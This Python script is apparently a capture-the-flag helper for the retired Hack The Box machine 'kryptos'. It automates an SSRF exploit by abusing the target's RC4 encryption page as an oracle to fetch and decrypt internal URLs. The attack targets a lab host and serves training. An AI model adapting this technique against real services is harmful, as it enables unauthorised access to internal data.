#!/usr/bin/python3
import requests
from os import system
from base64 import b64decode

'''
Write-up: https://0xrick.github.io/hack-the-box/kryptos/
Description: Script for Hack The Box retired machine kryptos, automates the process of encryption and decryption to make the exploitation of the ssrf vulnerability easier. 
'''

N = 1
cookies = {"PHPSESSID" : "99ub5git6oc7mka23ibjdorla2"} # replace this with your session cookie

def encrypt(url):
	params = {'cipher' : 'RC4','url' : url}
	req = requests.get("http://kryptos.htb/encrypt.php",params=params,cookies=cookies)
	response = req.text
	start = "id=\"output\">"
	end = "</textarea>"
	result = response[response.find(start)+len(start):response.rfind(end)]
	return result

def decrypt(filename):
	url = "http://10.10.xx.xx/" + filename # replace this with your ip address
	params = {'cipher' : 'RC4','url' : url}
	req = requests.get("http://kryptos.htb/encrypt.php",params=params,cookies=cookies)
	response = req.text
	start = "id=\"output\">"
	end = "</textarea>"
	result = response[response.find(start)+len(start):response.rfind(end)]
	result = b64decode(result)
	return result

def create_file(data):
	global N
	filename = "ENCRYPTED_" + str(N)
	data = b64decode(data)
	with open(filename,"wb") as f:
		f.write(data)
		f.close()
	return filename

YELLOW = "\033[93m"
GREEN = "\033[32m"

while True:
	url = input(GREEN + "[?] URL : ")
	if url == "EXIT" :
		system("rm ./ENCRYPTED_* && rm ./OUTPUT_*")
		exit()
	result = decrypt(create_file(encrypt(url)))
	outfile = "OUTPUT_" + str(N)
	with open(outfile,"wb") as f:
		f.write(result)
		f.close()
	print(YELLOW + "[*] Result :")
	system("cat ./" + outfile)
	N+=1
